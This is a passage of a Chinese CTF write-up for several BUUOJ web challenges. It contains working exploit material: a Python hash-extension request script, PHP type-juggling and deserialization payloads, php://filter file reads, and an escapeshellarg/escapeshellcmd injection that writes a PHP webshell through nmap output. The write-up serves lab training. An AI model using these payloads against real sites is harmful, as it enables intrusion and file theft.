class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://a917963c-0d87-4c23-b312-40315cbdd792.node3.buuoj.cn\"</span></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get Sign</span></span><br><span class=\"line\">route = <span class=\"string\">\"/geneSign\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">re1 = s.get(url + route+<span class=\"string\">\"?param=local_file:flag.txt\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re1.content, re1.request.headers</span><br><span class=\"line\"></span><br><span class=\"line\">hashs = <span class=\"string\">\"4a0fa89f8745038437386ca78367e28d\"</span></span><br><span class=\"line\">action = <span class=\"string\">\"scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read\"</span></span><br><span class=\"line\"><span class=\"comment\"># action = a.replace(\"\\\\x\", \"%\")</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> action</span><br><span class=\"line\">cookie = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"action\"</span>: action,</span><br><span class=\"line\">    <span class=\"string\">\"sign\"</span>: hashs,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">route2 = <span class=\"string\">\"/De1ta\"</span></span><br><span class=\"line\">re2 = s.get(url + route2 + <span class=\"string\">\"?param=local_file:flag.txt\"</span>, cookies=cookie)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re2.content</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Buy-Flag\"><a href=\"#Buy-Flag\" class=\"headerlink\" title=\"Buy Flag\"></a>Buy Flag</h3><p>查看源码发现：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">\t$password = $_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"password can't be number&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">elseif</span> ($password == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Password Right!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>抓包传数据：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/pay.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: b1fc07df-c7ae-46e3-8a06-565ab682d9ca.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: user=1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 28</span><br><span class=\"line\"></span><br><span class=\"line\">money[]00000000&amp;password=404%23</span><br></pre></td></tr></table></figure>\n\n<p>发现身份验证不通过，看到 Cookie ，改成 1 ；绕过 <code>is_numeric</code> 加 </p>\n<p><code>%23</code> ; 传完又提示 money 长度过长，数组绕过。</p>\n<h3 id=\"nizhuansiwei\"><a href=\"#nizhuansiwei\" class=\"headerlink\" title=\"nizhuansiwei\"></a>nizhuansiwei</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code> 伪协议post数据： <code>php://input</code> ;</p>\n<p><code>include($file);</code> 这里包含了一个文件并且提示文件名字，我们再用另一个伪协议读一下文件内容：</p>\n<p><code>php://filter/convert.base64-encode/resource=useless.php</code></p>\n<p>*注：只有一个 <code>include()</code> 即可使用伪协议将文件内容包含出来</p>\n<p>将得到内容解密：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>进行序列化：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">new</span> Flag();</span><br><span class=\"line\">$a-&gt;file = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>\n\n<p>现在的 url ：<code>buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>\n<h3 id=\"include\"><a href=\"#include\" class=\"headerlink\" title=\"include\"></a>include</h3><p>伪协议 <code>?file=php://filter/convert.base64-encode/resource=index.php</code> 读一下源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&apos;hacker!&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &apos;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&apos;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>哦，然后直接读 <code>flag.php</code></p>\n<h3 id=\"Online-Tool\"><a href=\"#Online-Tool\" class=\"headerlink\" title=\"Online Tool\"></a>Online Tool</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class=\"line\">    $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] = $_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'host'</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $host = $_GET[<span class=\"string\">'host'</span>];</span><br><span class=\"line\">    $host = escapeshellarg($host);</span><br><span class=\"line\">    $host = escapeshellcmd($host);</span><br><span class=\"line\">    $sandbox = md5(<span class=\"string\">\"glzjin\"</span>. $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'you are in sandbox '</span>.$sandbox;</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span>.$host);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>百度到文章</p>\n<p>我们编写示例代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param = <span class=\"string\">\"127.0.0.1' -v -d a=1\"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"curl \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">输出结果：</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'127.0.0.1'</span>\\<span class=\"string\">''</span> -v -d a=<span class=\"number\">1</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">curl '</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class=\"line\"><span class=\"string\">                                 Dload  Upload   Total   Spent    Left  Speed</span></span><br><span class=\"line\"><span class=\"string\">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: 127.0.0.1\\</span></span><br><span class=\"line\"><span class=\"string\">* Closing connection 0</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们输入 <code>127.0.0.1&#39; -v -d a=1</code> 后，经过 <code>escapeshellarg()</code> 转义变成<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1&#39;</code> 。</p>\n<p> <code>&#39;</code> 被转义为 <code>\\&#39;</code> ,被隔开的两部分分别左右两端加上一对 <code>&#39;&#39;</code> 然后连接在一起；</p>\n<p> 然后经过 <code>escapeshelcmd()</code> 后，变成了 <code>&#39;127.0.0.1&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>, 可以看到上一步留下的 <code>\\</code> 再次被转义成 <code>\\\\</code> ，这时就只表示 <code>\\</code> ，不起转义作用，于是 <code>127.0.0.1</code> 单独成组，紧跟 <code>\\</code> ，后面两个单引号单独成组 <code>&#39;&#39;</code> ，只剩下结尾的一个 <code>&#39;</code> 被转义 <code>\\&#39;</code> </p>\n<p>最后执行的命令就变成了 <code>curl &#39;127.0.0.1&#39;\\ -v -d a=1&#39;</code> , 请求的是 <code>127.0.0.1\\</code> , POST的数据是 <code>a=1&#39;</code> .</p>\n<p>回到题目可以看到使用的是 <code>&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host</code>  ,而通过查看 nmap 手册发现输出命令，我们试一下</p>\n<p><code>nmap 127.0.0.1 -oN 1.php</code> </p>\n<p>查看 1.php 内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Thu Apr 23 19:48:07 2020 as: nmap -oN 1.php 127.0.0.1</span></span><br><span class=\"line\">Nmap scan report for localhost (127.0.0.1)</span><br><span class=\"line\">Host is up (0.0000060s latency).</span><br><span class=\"line\">Not shown: 998 closed ports</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">111/tcp open  rpcbind</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap <span class=\"keyword\">done</span> at Thu Apr 23 19:48:08 2020 -- 1 IP address (1 host up) scanned <span class=\"keyword\">in</span> 0.51 seconds</span></span><br></pre></td></tr></table></figure>\n\n<p>有了上面的知识后，剩下的就是想办法绕过题目的限制</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">example.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param1 = <span class=\"string\">\" ' &lt;?php echo `ls`;?&gt; -oN 1.php ' \"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param1);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"nmap \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"> <span class=\"string\">' &lt;?php echo `ls`;?&gt; -oN 1.php '</span> </span><br><span class=\"line\"><span class=\"string\">' '</span>\\<span class=\"string\">''</span> <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> `ls`;<span class=\"meta\">?&gt;</span> -oN <span class=\"number\">1.</span>php <span class=\"string\">'\\''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">nmap '</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-23 20:06 CST</span></span><br></pre></td></tr></table></figure>\n\n<p>查看 1.php 可以看到执行的命令是</p>\n<p><code>nmap -oN 1.php \\ &lt;?php echo</code>ls<code>;?&gt; \\\\</code></p>\n<p> 我们传入参数 <code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php &#39;</code>  , 加的单引号目的是为了通过单引号闭合转义加上的单引号。</p>\n<p>需要注意的是参数后面的单引号需要隔一个空格，不然生成的文件名就会是 <code>.php\\\\</code> ,不能被正常解析了。 随机我们运行 1.php ,可以看到成功解析了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/桌面# php 1.php</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Sat Apr 25 11:16:03 2020 as: nmap -oN 1.php \\ 1.php</span></span><br><span class=\"line\">1.php\\\\ </span><br><span class=\"line\">1.txt</span><br><span class=\"line\">ctf</span><br><span class=\"line\">dc-2.txt</span><br><span class=\"line\">escapeshellarg.php</span><br><span class=\"line\">index.php~</span><br><span class=\"line\">pickle1.py</span><br><span class=\"line\">shell-7.x-1.0-beta5.zip</span><br><span class=\"line\">shell.py</span><br><span class=\"line\">snippet.py</span><br><span class=\"line\">test.php</span><br><span class=\"line\">th.jpeg</span><br><span class=\"line\">top6000.txt</span><br><span class=\"line\"> \\\\</span><br><span class=\"line\">Failed to resolve \"\\\".</span><br><span class=\"line\">Failed to resolve \"&lt;?php\".</span><br></pre></td></tr></table></figure>\n\n<p>对于本题，可以传入</p>\n<p><code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php  &#39;</code></p>\n<h3 id=\"piapiapia\"><a href=\"#piapiapia\" class=\"headerlink\" title=\"piapiapia\"></a>piapiapia</h3><p>扫描目录得到源码</p>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span> <span class=\"keyword\">extends</span> <span class=\"title\">mysql</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $table = <span class=\"string\">'users'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_exists</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$key_list = <span class=\"keyword\">Array</span>(<span class=\"string\">'username'</span>, <span class=\"string\">'password'</span>);</span><br><span class=\"line\">\t\t$value_list = <span class=\"keyword\">Array</span>($username, md5($password));</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::insert(<span class=\"keyword\">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span 